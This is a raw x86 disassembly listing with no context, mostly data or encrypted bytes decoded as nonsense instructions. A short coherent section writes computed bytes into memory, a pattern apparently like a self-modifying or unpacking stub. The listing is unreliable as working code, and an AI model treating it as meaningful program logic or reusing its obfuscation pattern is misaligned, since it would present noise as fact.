  4030f6:	mov    esp,0xd97bcd27
  4030fb:	add    eax,0xc4367ae
  403100:	sbb    BYTE PTR [edi-0x610d29f1],0x6c
  403107:	retf   0x90a5
  40310a:	jecxz  0x403105
  40310c:	sahf   
  40310d:	sbb    edi,eax
  40310f:	push   0x5c080e2b
  403114:	pop    ebx
  403115:	cmp    eax,0x8ac718e4
  40311a:	mov    BYTE PTR [esi+0x52],bl
  40311d:	cmp    ch,BYTE PTR ds:[esi-0xa]
  403121:	cs or  eax,0x20b4156e
  403127:	mov    bl,0xb2
  403129:	mov    edi,0x7ea0d528
  40312e:	scas   al,BYTE PTR es:[edi]
  40312f:	sbb    bh,BYTE PTR [ebx-0x51]
  403132:	jb     0x40315d
  403134:	push   esi
  403135:	sahf   
  403136:	adc    edi,0x11
  403139:	dec    ecx
  40313a:	pop    ds
  40313b:	or     al,0x85
  40313d:	inc    ebx
  40313e:	lahf   
  40313f:	mov    ebx,0x4aeec63f
  403144:	call   0xb757:0xb3759b58
  40314b:	leave  
  40314c:	arpl   WORD PTR [edi+ecx*1-0x270dae85],dx
  403153:	dec    ebp
  403154:	or     BYTE PTR cs:[eax-0x59],bh
  403158:	jg     0x4030e9
  40315a:	in     eax,0x63
  40315c:	in     al,dx
  40315d:	mov    bh,0xa2
  40315f:	inc    edx
  403160:	aas    
  403161:	out    dx,eax
  403162:	adc    eax,0xa8c7381b
  403167:	inc    ecx
  403168:	loop   0x40319f
  40316a:	sub    DWORD PTR [esi-0x80],0x8
  40316e:	push   edx
  40316f:	ffreep st(4)
  403171:	push   ss
  403172:	jle    0x403135
  403174:	loopne 0x403117
  403176:	fmul   DWORD PTR [edx+0x2704a1f7]
  40317c:	adc    eax,0x599a3ce7
  403181:	imul   esi,DWORD PTR [ebx-0x61c9e52b],0x1cd627c0
  40318b:	out    dx,al
  40318c:	jecxz  0x403153
  40318e:	test   BYTE PTR [eax+0x4da3a7f5],ch
  403194:	or     eax,0xbfb0002
  403199:	pushf  
  40319a:	adc    eax,0x1d3dc6b2
  40319f:	pop    es
  4031a0:	push   ebp
  4031a1:	pop    ds
  4031a2:	(bad)  
  4031a4:	imul   ebp,DWORD PTR [esi],0x13
  4031a7:	dec    edx
  4031a8:	js     0x403154
  4031aa:	(bad)  
  4031ab:	cmp    esp,ebx
  4031ad:	scas   al,BYTE PTR es:[edi]
  4031ae:	xor    eax,0x41c65986
  4031b3:	leave  
  4031b4:	sub    cl,dl
  4031b6:	pop    ds
  4031b7:	sub    al,0xaa
  4031b9:	and    al,0xcf
  4031bb:	push   0x530d6405
  4031c0:	or     al,BYTE PTR [ecx]
  4031c2:	jbe    0x40318e
  4031c4:	adc    eax,0x83ce42ca
  4031c9:	mov    DWORD PTR [ebx+edx*8+0x31],ecx
  4031cd:	push   ss
  4031ce:	jbe    0x40315b
  4031d0:	mov    esp,0x1381db26
  4031d5:	dec    eax
  4031d6:	sub    eax,0x9f452334
  4031db:	add    al,BYTE PTR gs:[edx]
  4031de:	(bad)  
  4031df:	out    0x95,al
  4031e1:	mov    BYTE PTR [edx-0x2d82fbe5],cl
  4031e7:	(bad)  
  4031e8:	sbb    al,0x5a
  4031ea:	mov    ch,0xe2
  4031ec:	or     DWORD PTR [esi-0x2aabe140],edx
  4031f2:	std    
  4031f3:	dec    ebp
  4031f4:	jl     0x4031ac
  4031f6:	fistp  WORD PTR [esi-0x7f]
  4031f9:	int3   
  4031fa:	je     0x4031d2
  4031fc:	fwait
  4031fd:	lods   eax,DWORD PTR ds:[esi]
  4031fe:	repnz mov ds:0xaaeace40,eax
  403204:	cdq    
  403205:	aam    0x29
  403207:	shr    BYTE PTR [ebx],0xc7
  40320a:	mov    esi,0xdb8187d0
  40320f:	cs (bad) 
  403211:	int3   
  403212:	fimul  DWORD PTR [eax-0x37]
  403215:	(bad)  
  403216:	jg     0x4031dd
  403218:	pop    ss
  403219:	cmp    eax,0x27823ec2
  40321e:	jge    0x403282
  403220:	or     al,0xda
  403222:	imul   BYTE PTR es:[ebx-0x57]
  403226:	push   esp
  403227:	cmp    dh,0x87
  40322a:	inc    esi
  40322b:	sub    ch,BYTE PTR [esi]
  40322d:	mov    ds:0xee5913b3,eax
  403232:	cmp    DWORD PTR [edi-0x68],eax
  403235:	adc    al,0x5b
  403237:	sub    dh,BYTE PTR [ecx]
  403239:	or     ecx,DWORD PTR [edx+0x52c5392f]
  40323f:	mov    eax,0xc251b163
  403244:	jecxz  0x4032b6
  403246:	push   ebx
  403247:	imul   edx,DWORD PTR [esi],0xffffff9f
  40324a:	(bad)  
  40324b:	sbb    eax,0x8f39e6c0
  403250:	daa    
  403251:	retf   
  403252:	loope  0x403206
  403254:	cmp    al,0x56
  403256:	inc    esi
  403257:	sbb    BYTE PTR [ecx+0x651c141],dl
  40325d:	hlt    
  40325e:	dec    esi
  40325f:	(bad)  
  403260:	sub    ecx,DWORD PTR [ecx+0x79d9f38e]
  403266:	(bad)  
  403267:	rcl    esp,1
  403269:	stos   BYTE PTR es:[edi],al
  40326a:	pop    edx
  40326b:	mov    al,ds:0x42434d36
  403270:	aaa    
  403271:	adc    ch,0xd9
  403274:	mov    ebx,0xeb55cb3a
  403279:	jbe    0x4032f3
  40327b:	fstp   TBYTE PTR [eax]
  40327d:	or     bl,bl
  40327f:	sbb    eax,0x3b35a55f
  403284:	mov    bh,0x59
  403286:	std    
  403287:	pop    esi
  403288:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403289:	dec    ebx
  40328a:	jp     0x4032a6
  40328c:	cmp    ecx,ecx
  40328e:	ds jp  0x4032bd
  403291:	test   al,0xdd
  403293:	add    BYTE PTR [ebx+ecx*2],0xc9
  403297:	mov    ds:0x46de5752,eax
  40329c:	pop    eax
  40329d:	and    DWORD PTR [edi-0x4e],edx
  4032a0:	mov    dl,0x3e
  4032a2:	mov    ds:0x8f080a13,al
  4032a7:	mov    ds:0x1fc5167e,al
  4032ac:	das    
  4032ad:	(bad)  
  4032ae:	out    0xe0,eax
  4032b0:	dec    ecx
  4032b1:	repnz add ebx,edi
  4032b4:	int3   
  4032b5:	cmp    bl,BYTE PTR ds:0x6827cd00
  4032bb:	jge    0x4032e3
  4032bd:	jnp    0x40325c
  4032bf:	xchg   ebp,eax
  4032c0:	mov    ebx,0x2e7a1b37
  4032c5:	dec    ebx
  4032c6:	neg    dh
  4032c8:	inc    edi
  4032c9:	mov    eax,ds:0x90b8c8c0
  4032ce:	dec    esp
  4032cf:	fidiv  WORD PTR [edx-0x4f]
  4032d2:	pop    ebp
  4032d3:	xchg   BYTE PTR [ecx+0x67],bl
  4032d6:	int    0xc1
  4032d8:	adc    al,0x5e
  4032da:	jae    0x4032ee
  4032dc:	push   edx
  4032dd:	jge    0x4032cb
  4032df:	and    eax,0x67742d07
  4032e4:	xchg   ebp,eax
  4032e5:	xchg   eax,ebx
  4032e7:	sub    eax,0xe267e09a
  4032ec:	stos   BYTE PTR es:[edi],al
  4032ed:	test   dh,al
  4032ef:	mov    ecx,0xed3bc57a
  4032f4:	adc    al,BYTE PTR [esi]
  4032f6:	stos   BYTE PTR es:[edi],al
  4032f7:	sbb    eax,DWORD PTR [edi+0x20f5afe6]
  4032fd:	add    edx,eax
  4032ff:	imul   ecx,DWORD PTR [ebx+0xdf570b0],0xffffffa3
  403306:	add    BYTE PTR [ecx],bh
  403308:	jge    0x403346
  40330a:	nop
  40330b:	dec    ecx
  40330c:	ds mov bl,0x9f
  40330f:	mov    eax,ss
  403311:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403312:	ds dec esi
  403314:	addr16 jmp 0x57d7:0xfa2a76b
  40331c:	aas    
  40331d:	int    0x5e
  40331f:	sti    
  403320:	cmp    al,0x30
  403322:	mov    dl,0x60
  403324:	jnp    0x4032ff
  403326:	cld    
  403327:	jb     0x4032d8
  403329:	inc    ebp
  40332a:	shl    BYTE PTR [edi+0x59],0xd
  40332e:	stc    
  40332f:	stos   DWORD PTR es:[edi],eax
  403330:	cmc    
  403331:	pop    edi
  403332:	in     eax,0xf5
  403334:	call   0xcd34d55f
  403339:	add    bl,ah
  40333b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40333c:	stos   BYTE PTR es:[edi],al
  40333d:	hlt    
  40333e:	xor    ebx,DWORD PTR [esi-0x111e4704]
  403344:	jecxz  0x4032e6
  403346:	punpcklbw mm7,DWORD PTR [edx-0x7d]
  40334a:	pop    es
  40334b:	push   esp
  40334c:	sub    BYTE PTR [edi],al
  40334e:	adc    eax,ebx
  403350:	inc    ebx
  403351:	fcmovne st,st(7)
  403353:	sbb    DWORD PTR [ecx-0x48],ecx
  403356:	sub    al,ah
  403358:	dec    esi
  403359:	cmp    al,0x2
  40335b:	(bad)  
  40335d:	mov    bl,0xf2
  40335f:	imul   esp,DWORD PTR [edi-0x43],0x7dc8d0c3
  403366:	ins    BYTE PTR es:[edi],dx
  403367:	js     0x4033af
  403369:	mov    ch,0xe
  40336b:	mov    ds:0xe6422969,al
  403370:	clc    
  403371:	(bad)  
  403372:	mov    fs,edx
  403374:	popa   
  403375:	nop
  403376:	(bad)  ds:0xa4951d2a
  40337c:	jmp    0x4033c4
  40337e:	inc    ebx
  40337f:	push   edx
  403380:	fcom   DWORD PTR [ebx-0x78]
  403383:	add    al,0x3e
  403385:	mov    eax,ds:0x5789f8ae
  40338a:	mov    ebx,0xf0336d90
  40338f:	lock fidivr DWORD PTR [ebx-0x6d]
  403393:	mov    esi,0x60e22614
  403398:	fxch   st(6)
  40339a:	xor    DWORD PTR [esi-0x64efeec3],ecx
  4033a0:	mov    ah,0x32
  4033a2:	ret    0x6015
  4033a5:	cmc    
  4033a6:	mov    edi,0x78fd0692
  4033ab:	add    DWORD PTR [eax],ebx
  4033ad:	out    dx,al
  4033ae:	sub    BYTE PTR [esi+0x48dfa7fc],dl
  4033b4:	ret    
  4033b5:	sub    DWORD PTR [edi-0x2f],0xffffff8a
  4033b9:	fisubr DWORD PTR [ebx-0x22]
  4033bc:	or     ebx,ecx
  4033be:	adc    al,0x70
  4033c0:	ficom  WORD PTR [edi]
  4033c2:	jmp    0x403368
  4033c4:	xchg   esi,eax
  4033c5:	inc    eax
  4033c6:	mov    ah,0x5c
  4033c8:	mov    ch,0x3a
  4033ca:	mov    ah,0x8e
  4033cc:	test   BYTE PTR [ebx],0xee
  4033cf:	mov    ebx,0x8eaeb17e
  4033d4:	jae    0x40336f
  4033d6:	(bad)  
  4033d8:	add    edx,DWORD PTR [esi-0x38]
  4033db:	fstp   TBYTE PTR [edx+0x77f2f453]
  4033e1:	repz rcl DWORD PTR [ebx],1
  4033e4:	outs   dx,BYTE PTR ds:[esi]
  4033e5:	sbb    BYTE PTR [edi],bh
  4033e7:	xchg   ebx,eax
  4033e8:	pop    esi
  4033e9:	sbb    cl,BYTE PTR [esi+0x4bbe43ed]
  4033ef:	ds sbb eax,0xc054f5e6
  4033f5:	xor    eax,0x690a9d11
  4033fa:	sar    DWORD PTR [eax],0x2e
  4033fd:	sub    DWORD PTR [eax-0x5d],esp
  403400:	xchg   ebp,eax
  403401:	and    ah,BYTE PTR [esp+esi*8]
  403404:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403405:	into   
  403406:	xor    DWORD PTR [edx],0xffffffa7
  403409:	in     al,dx
  40340a:	add    BYTE PTR [eax],bl
  40340c:	mov    ds:0x89218d6f,eax
  403411:	sahf   
  403412:	pop    ds
  403413:	mul    BYTE PTR [edx]
  403415:	loop   0x40344a
  403417:	xchg   ecx,eax
  403418:	mov    dl,0x9
  40341a:	sub    ebx,eax
  40341c:	push   ebx
  40341d:	push   edx
  40341e:	js     0x40342b
  403420:	fwait
  403421:	inc    eax
  403422:	sahf   
  403423:	test   esi,edi
  403425:	je     0x4033da
  403427:	sub    eax,0xf149c85a
  40342c:	push   es
  40342d:	adc    BYTE PTR [ebx],bl
  40342f:	pop    edx
  403430:	lods   al,BYTE PTR ds:[esi]
  403431:	inc    edi
  403432:	iret   
  403433:	and    edx,eax
  403435:	xor    al,0xef
  403437:	and    al,0x60
  403439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40343a:	bound  ecx,QWORD PTR [ebp+0x694a8564]
  403440:	dec    ebp
  403441:	stos   BYTE PTR es:[edi],al
  403442:	iret   
  403443:	int    0x7a
  403445:	mov    esp,DWORD PTR [esi+ecx*8-0x245e981a]
  40344c:	ret    
  40344d:	push   ecx
  40344e:	pusha  
  40344f:	bound  ebx,QWORD PTR [ecx]
  403451:	scas   eax,DWORD PTR es:[edi]
  403452:	or     BYTE PTR ds:0x60943f2c,cl
  403458:	rol    DWORD PTR [edi],cl
  40345a:	dec    eax
  40345b:	and    edi,DWORD PTR [edx-0x67]
  40345e:	retf   0xa27b
  403461:	add    esi,eax
  403463:	ss mov esp,0x873fd4fb
  403469:	push   esp
  40346a:	jmp    0x84abe76a
  40346f:	xchg   ch,cl
  403471:	sub    al,0x9e
  403473:	mov    ecx,fs
  403475:	mov    ebx,0x192ff9ff
  40347a:	(bad)  ds:0xf47fc738
  403480:	mov    bl,0x75
  403482:	cmc    
  403483:	ss out 0xd7,al
  403486:	sbb    eax,ebx
  403488:	xchg   esi,eax
  403489:	jecxz  0x4034fd
  40348b:	outs   dx,BYTE PTR ds:[esi]
  40348c:	mov    DWORD PTR [esi],0x20ed22a
  403492:	cmp    DWORD PTR [eax+0x3eec9c3a],eax
  403498:	cli    
  403499:	fsubr  QWORD PTR [esi-0x11c8890a]
  40349f:	jbe    0x40343d
  4034a1:	ja     0x403445
  4034a3:	nop
  4034a4:	pop    ebp
  4034a5:	in     al,dx
  4034a6:	xchg   esp,eax
  4034a7:	hlt    
  4034a8:	scas   al,BYTE PTR es:[edi]
  4034a9:	loope  0x4034db
  4034ab:	in     al,dx
  4034ac:	push   0x7cdbdb8c
  4034b1:	mov    ds:0x81e8c293,al
  4034b6:	(bad)  
  4034b7:	pop    edx
  4034b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034b9:	jb     0x4034a3
  4034bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034bc:	outs   dx,BYTE PTR ds:[esi]
  4034bd:	loope  0x4034c2
  4034bf:	and    eax,0x35177d81
  4034c4:	out    dx,eax
  4034c5:	es js  0x403539
  4034c8:	mov    eax,0xb1c151a6
  4034cd:	imul   ebp,DWORD PTR [eax+0x6493732a],0x7d
  4034d4:	int    0x84
  4034d6:	push   ds
  4034d7:	inc    ecx
  4034d8:	mov    ?,WORD PTR [edi]
  4034da:	mov    ecx,0x40d732d7
  4034df:	and    DWORD PTR [ebx],edx
  4034e1:	and    al,bh
  4034e3:	jle    0x40355c
  4034e5:	(bad)  cs:[esi-0x142abca7]
  4034ec:	mul    DWORD PTR [esi+0x2b4c5035]
  4034f2:	fild   WORD PTR ds:0xa03bb5c7
  4034f8:	outs   dx,DWORD PTR ds:[esi]
  4034f9:	ins    BYTE PTR es:[edi],dx
  4034fa:	lods   al,BYTE PTR ds:[esi]
  4034fb:	ret    
  4034fc:	call   0x1ab1:0xd3ec6d46
  403503:	out    dx,al
  403504:	inc    esp
  403505:	jnp    0x40350b
  403507:	fldcw  WORD PTR [ebp-0x456103cc]
  40350d:	push   ecx
  40350e:	das    
  40350f:	retf   
  403510:	pop    esi
  403511:	retf   0x923f
  403514:	jo     0x4034c7
  403516:	jmp    0x213d70e1
  40351b:	sub    DWORD PTR [eax+0x5f57dd1a],ebx
  403521:	xchg   esi,eax
  403522:	jg     0x403501
  403524:	cs xchg ebx,eax
  403526:	mov    esi,0x930eedd1
  40352b:	sub    eax,0x56c8ce0a
  403530:	pop    ds
  403531:	mov    edi,0x522742ef
  403536:	pop    ebp
  403537:	out    0x4b,al
  403539:	dec    esp
  40353a:	jle    0x403574
  40353c:	loopne 0x403517
  40353e:	or     BYTE PTR [edx-0x13],ah
  403541:	cld    
  403542:	fwait
  403543:	mov    edi,0x19ebef67
  403548:	cli    
  403549:	(bad)  
  40354a:	imul   edx,DWORD PTR [edi-0xa],0x38
  40354e:	enter  0xd1c8,0xfc
  403552:	imul   esi,DWORD PTR [eax+0x3841595e],0x68
  403559:	xchg   edi,eax
  40355a:	inc    esp
  40355b:	xchg   esi,eax
  40355c:	dec    ecx
  40355d:	dec    ecx
  40355e:	mov    DWORD PTR [edx-0x76],0xc135a3cd
  403565:	adc    BYTE PTR [edx],bh
  403567:	lods   eax,DWORD PTR ds:[esi]
  403568:	sti    
  403569:	jo     0x4034fe
  40356b:	and    al,0x8d
  40356d:	and    bh,BYTE PTR [edx]
  40356f:	inc    ecx
  403570:	imul   edx,DWORD PTR [esi+0x4e695486],0x9d3ccee8
  40357a:	push   edx
  40357b:	in     al,dx
  40357c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40357d:	aad    0x92
  40357f:	jnp    0x40350d
  403581:	fist   DWORD PTR [eax+ecx*4-0x37]
  403585:	out    dx,eax
  403586:	rcr    esi,1
  403588:	mov    gs,WORD PTR [ebx]
  40358a:	dec    ebx
  40358b:	test   al,0x72
  40358d:	rol    cl,cl
  40358f:	pop    esi
  403590:	sub    eax,0x2f93069b
  403595:	jle    0x403579
  403597:	jns    0x403578
  403599:	ja     0x40355c
  40359b:	xchg   DWORD PTR [esp+eiz*4-0x4a],esp
  40359f:	jmp    0x4035aa
  4035a1:	pop    edx
  4035a2:	std    
  4035a3:	and    edi,ecx
  4035a5:	or     cl,ch
  4035a7:	sbb    BYTE PTR [eax+0x29],0x4e
  4035ab:	fimul  DWORD PTR ds:0x19d83e0b
  4035b1:	mov    cl,0x75
  4035b3:	aas    
  4035b4:	dec    esp
  4035b5:	xchg   esp,eax
  4035b6:	test   BYTE PTR cs:[esi],bl
  4035b9:	dec    esp
  4035ba:	and    bl,BYTE PTR [edi]
  4035bc:	dec    esi
  4035bd:	mov    ecx,ecx
  4035bf:	sub    al,dh
  4035c1:	pop    ds
  4035c2:	mov    ebp,0x516d7b1c
  4035c7:	dec    eax
  4035c8:	rcl    BYTE PTR [ebp-0x4],1
  4035cb:	mov    ds:0xd1e03a4e,al
  4035d0:	imul   BYTE PTR [esi]
  4035d2:	jae    0x40355a
  4035d4:	leave  
  4035d5:	or     al,0xf7
  4035d7:	out    0xa2,eax
  4035d9:	and    edi,DWORD PTR [edi+0x5d]
  4035dc:	jmp    0x4035b4
  4035de:	mov    eax,ds:0x92f2f3a9
  4035e3:	test   eax,0x99a9b895
  4035e8:	sahf   
  4035e9:	xor    eax,esp
  4035eb:	fmul   QWORD PTR [edx-0x2340e65c]
  4035f1:	jbe    0x40366a
  4035f3:	bnd jmp 0x403651
  4035f6:	push   ebx
  4035f7:	push   es
  4035f8:	pop    ds
  4035f9:	or     al,0x50
  4035fb:	imul   esi,DWORD PTR [eax+ebp*8],0x13485cf
  403602:	mov    edx,0x71228e14
  403607:	add    BYTE PTR [edx-0x15f2c727],dl
  40360d:	adc    DWORD PTR [ebp+0x5d],esi
  403610:	add    eax,0x2adeb7ff
  403615:	dec    edi
  403616:	fwait
  403617:	mov    BYTE PTR [ebp-0x55],0x3a
  40361b:	ins    DWORD PTR es:[edi],dx
  40361c:	jno    0x403626
  40361e:	ror    DWORD PTR [esi+0x20ff1770],1
  403624:	inc    ebx
  403625:	jmp    0x87b1:0x583fba55
  40362c:	cmp    BYTE PTR [ebp+0x3e64d399],0xa6
  403633:	test   DWORD PTR [ebx],0xea047554
  403639:	sbb    bl,dh
  40363b:	dec    ebp
  40363c:	aas    
  40363d:	add    edi,eax
  40363f:	jmp    0x41712eb4
  403644:	arpl   sp,dx
  403646:	mov    al,0x75
  403648:	or     al,BYTE PTR [edi]
  40364a:	mov    BYTE PTR [esi-0x68],dl
  40364d:	cdq    
  40364e:	lahf   
  40364f:	push   edi
  403650:	push   cs
  403651:	test   BYTE PTR [esi],al
  403653:	(bad)  
  403655:	fistp  QWORD PTR [edi+0x3b52c7e8]
  40365b:	mov    al,ds:0x42f77c3c
  403660:	jge    0x403625
  403662:	jae    0x403686
  403664:	inc    eax
  403665:	call   0xc2b6:0x62b34940
  40366c:	scas   al,BYTE PTR es:[edi]
  40366d:	dec    esp
  40366e:	fidiv  WORD PTR [eax-0x7325969c]
  403674:	push   cs
  403675:	inc    esi
  403676:	jl     0x403620
  403678:	push   ds
  403679:	xlat   BYTE PTR ds:[ebx]
  40367a:	add    BYTE PTR [ecx+0x5ecfa347],cl
  403680:	sbb    BYTE PTR [edi-0xcc4c96b],dl
  403686:	fxch   st(2)
  403688:	add    DWORD PTR [edi+0x38],ecx
  40368b:	sub    al,0xcc
  40368d:	adc    esp,DWORD PTR [esp+ebx*2+0x3ca86f88]
  403694:	aad    0x14
  403696:	sub    eax,0x54ff28d1
  40369b:	and    al,0x42
  40369d:	fld    TBYTE PTR [ebx]
  40369f:	outs   dx,DWORD PTR ds:[esi]
  4036a0:	sub    eax,0xffacd981
  4036a5:	push   ebp
  4036a6:	sbb    ecx,ebx
  4036a8:	or     ebx,DWORD PTR [ebp-0x52]
  4036ab:	adc    BYTE PTR [eax+0x7],bl
  4036ae:	pushf  
  4036af:	scas   eax,DWORD PTR es:[edi]
  4036b0:	stc    
  4036b1:	mov    al,0x58
  4036b3:	ss cli 
  4036b5:	addr16 pop ds
  4036b7:	mov    bl,BYTE PTR [ebx+eiz*8+0x32a608dc]
  4036be:	cwde   
  4036bf:	or     al,0xfe
  4036c1:	push   ss
  4036c2:	mov    dh,BYTE PTR [edx+ebx*4+0xa]
  4036c6:	pop    ebx
  4036c7:	int3   
  4036c8:	loopne 0x4036f1
  4036ca:	and    al,0xd5
  4036cc:	sub    dh,BYTE PTR ds:[edx-0x3f]
  4036d0:	adc    eax,0x79aad5e3
  4036d5:	cmp    al,0xb9
  4036d7:	(bad)  
  4036d8:	jmp    0x21aa:0xe1e1c404
  4036df:	icebp  
  4036e0:	jnp    0x4036a3
  4036e2:	xchg   esp,eax
  4036e3:	fimul  WORD PTR [ebx+0x6767b0]
  4036e9:	inc    esi
  4036ea:	jl     0x40370a
  4036ec:	aaa    
  4036ed:	fs mov al,0xaa
  4036f0:	xchg   esi,eax
  4036f1:	inc    eax
  4036f2:	fwait
  4036f3:	stos   BYTE PTR es:[edi],al
  4036f4:	aad    0x89
  4036f6:	push   ss
  4036f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036f8:	shl    ah,0xab
  4036fb:	xor    BYTE PTR [edx+0xd],bl
  4036fe:	mov    al,0x35
  403700:	adc    BYTE PTR [edi],dh
  403702:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403703:	pop    esp
  403704:	out    dx,eax
  403705:	mov    cl,0xbd
  403707:	or     dh,dl
  403709:	les    ebp,FWORD PTR [edi+0x4377a64d]
  40370f:	aaa    
  403710:	cli    
  403711:	fadd   DWORD PTR [ecx+ebx*1-0x3c8973f0]
  403718:	out    0x5e,eax
  40371a:	xchg   edx,eax
  40371b:	mov    esp,0xa29a60ac
  403720:	clc    
  403721:	rcr    DWORD PTR [ecx-0x12],cl
  403724:	ror    DWORD PTR [esi+ebp*4+0x1f],cl
  403728:	mov    al,ds:0x36d0f351
  40372d:	push   0xd525f10e
  403732:	mov    eax,0x3e8da383
  403737:	cmp    DWORD PTR [ecx+0x7a],0xa2174160
  40373e:	imul   esi,DWORD PTR [ecx-0x22],0x3d
  403742:	add    al,0x8b
  403744:	fwait
  403745:	clc    
  403746:	jle    0x403704
  403748:	jmp    0x4037a1
  40374a:	call   0x16a1d0eb
  40374f:	cmc    
  403750:	cdq    
  403751:	dec    eax
  403752:	jle    0x4037cf
  403754:	repz out dx,eax
  403756:	mov    dl,0x50
  403758:	pop    ecx
  403759:	xchg   ebx,eax
  40375a:	cmp    BYTE PTR [ebx+edi*2+0x54],dl
  40375e:	dec    eax
  40375f:	push   edx
  403760:	pusha  
  403761:	in     eax,dx
  403762:	inc    eax
  403763:	clc    
  403764:	mov    cs,WORD PTR [edi]
  403766:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403767:	xor    al,0x3e
  403769:	sub    eax,0x5ff7190c
  40376e:	add    cl,dl
  403770:	out    0xa2,al
  403772:	cs sbb dl,dl
  403775:	mov    edi,0x30fa05a0
  40377a:	mov    eax,ds:0x3a77533a
  40377f:	pop    ebp
  403780:	push   es
  403781:	inc    ebx
  403782:	sub    ch,BYTE PTR [eax-0x53e8258d]
  403788:	mov    edx,0xa23bd17
  40378d:	inc    edi
  40378e:	dec    esp
  40378f:	test   BYTE PTR [ecx-0x75],al
  403792:	inc    edx
  403793:	hlt    
  403794:	adc    al,0xea
  403796:	push   esi
  403797:	inc    edi
  403798:	loopne 0x403770
  40379a:	mov    esp,0x19b38c1b
  40379f:	add    eax,DWORD PTR [ebp+0x5e]
  4037a2:	sub    eax,0x6b75d3ea
  4037a7:	sub    al,0xc5
  4037a9:	mov    cl,0xd8
  4037ab:	icebp  
  4037ac:	gs xchg ebp,eax
  4037ae:	cld    
  4037af:	cld    
  4037b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037b2:	outs   dx,BYTE PTR ds:[esi]
  4037b3:	xor    eax,0x820466a4
  4037b8:	jo     0x4037a8
  4037ba:	sub    DWORD PTR [ebx-0x13],esi
  4037bd:	not    DWORD PTR [eax-0x61bd665e]
  4037c3:	push   0xffffffa3
  4037c5:	test   eax,0x87dccf53
  4037ca:	xor    ah,cl
  4037cc:	lahf   
  4037cd:	pushf  
  4037ce:	out    0xbc,eax
  4037d0:	fisttp WORD PTR [ebp-0x225f5cff]
  4037d6:	push   ebp
  4037d7:	aam    0xb1
  4037d9:	mov    bh,0x13
  4037db:	pop    ebx
  4037dc:	test   eax,0x56048acd
  4037e1:	scas   eax,DWORD PTR es:[edi]
  4037e2:	fst    DWORD PTR [ecx]
  4037e4:	enter  0x45b6,0xd1
  4037e8:	pop    edi
  4037e9:	mov    ecx,0xf98e26a3
  4037ee:	call   0x41ae62
  4037f3:	test   eax,eax
  4037f5:	je     0x403826
  4037fb:	lea    eax,[ebp-0x90]
  403801:	push   eax
  403802:	mov    eax,DWORD PTR [ebp-0x30]
  403805:	xor    eax,esi
  403807:	add    eax,edi
  403809:	push   eax
  40380a:	mov    eax,DWORD PTR [ebp-0x2c]
  40380d:	add    eax,0xaa
  403812:	push   eax
  403813:	mov    eax,DWORD PTR [ebp-0x2c]
  403816:	mov    eax,DWORD PTR [eax+0x198]
  40381c:	push   DWORD PTR [eax]
  40381e:	call   0x405c89
  403823:	mov    DWORD PTR [ebp-0x40],eax
  403826:	lea    eax,[ebp+0x4]
  403829:	mov    DWORD PTR [ebp-0x34],eax
  40382c:	mov    eax,DWORD PTR [ebp-0x8]
  40382f:	mov    eax,DWORD PTR [eax]
  403831:	mov    eax,DWORD PTR [eax]
  403833:	mov    eax,DWORD PTR [eax]
  403835:	test   eax,eax
  403837:	je     0x405c7a
  40383d:	lea    eax,[ebp-0xc]
  403840:	mov    DWORD PTR [ebp-0x4c],eax
  403843:	mov    eax,DWORD PTR [ebp-0x3c]
  403846:	mov    DWORD PTR [ebp-0xc],eax
  403849:	mov    eax,DWORD PTR [ebp-0x8]
  40384c:	mov    eax,DWORD PTR [eax]
  40384e:	mov    eax,DWORD PTR [eax]
  403850:	mov    eax,DWORD PTR [eax]
  403852:	sub    DWORD PTR [ebp-0xc],eax
  403855:	mov    ecx,DWORD PTR [ebp-0x10]
  403858:	xor    ecx,esi
  40385a:	mov    eax,0xffcd8d25
  40385f:	sub    eax,ecx
  403861:	add    DWORD PTR [ebp-0xc],eax
  403864:	mov    eax,DWORD PTR [ebp-0xc]
  403867:	mov    ecx,DWORD PTR [ebp-0x8]
  40386a:	mov    ecx,DWORD PTR [ecx]
  40386c:	mov    ecx,DWORD PTR [ecx]
  40386e:	mov    ecx,DWORD PTR [ecx]
  403870:	mov    DWORD PTR [ecx+0x1],eax
  403873:	mov    al,BYTE PTR [ebp-0x1]
  403876:	mov    ecx,DWORD PTR [ebp-0x8]
  403879:	mov    ecx,DWORD PTR [ecx]
  40387b:	mov    ecx,DWORD PTR [ecx]
  40387d:	mov    ecx,DWORD PTR [ecx]
  40387f:	push   DWORD PTR [ebp-0x2c]
  403882:	xor    al,0x6f
  403884:	sub    al,0xd
  403886:	mov    BYTE PTR [ecx],al
  403888:	jmp    0x405c4a
  40388d:	lods   eax,DWORD PTR ds:[esi]
  40388e:	mov    bh,0xe6
  403890:	ja     0x403876
  403892:	mov    ds:0xa508636b,eax
  403897:	fdivr  QWORD PTR fs:[edi-0x221d106e]
  40389e:	pop    edi
  40389f:	bound  esp,QWORD PTR [edx-0x23]
  4038a2:	pop    edi
  4038a3:	bound  esp,QWORD PTR [edx+0x19]
  4038a6:	xlat   BYTE PTR ds:[ebx]
  4038a7:	sub    ecx,DWORD PTR [ecx+0x35]
  4038aa:	mov    ecx,0x65e5a76
  4038af:	fldcw  WORD PTR cs:[ecx+edx*2+0x55]
  4038b4:	push   esi
  4038b5:	jmp    0x4038b0
  4038b7:	fsub   DWORD PTR [esp+eiz*2+0x3a]
  4038bb:	xchg   edx,eax
  4038bc:	mov    al,0xb8
  4038be:	mov    ecx,0xc0bc5b22
  4038c3:	mov    dh,0x21
  4038c5:	push   ecx
  4038c6:	sbb    DWORD PTR [ecx+eax*8],ebp
  4038c9:	call   0x293e:0x341f60d8
  4038d0:	xor    ebp,DWORD PTR [ebx+0x263b151]
  4038d6:	and    ah,ah
  4038d8:	test   DWORD PTR [ebx],ebx
  4038da:	dec    esi
  4038db:	mov    BYTE PTR [edi],0x79
  4038de:	imul   DWORD PTR [ecx-0x55]
  4038e1:	fldenv [esi]
  4038e3:	mov    al,ds:0xc5bfbb77
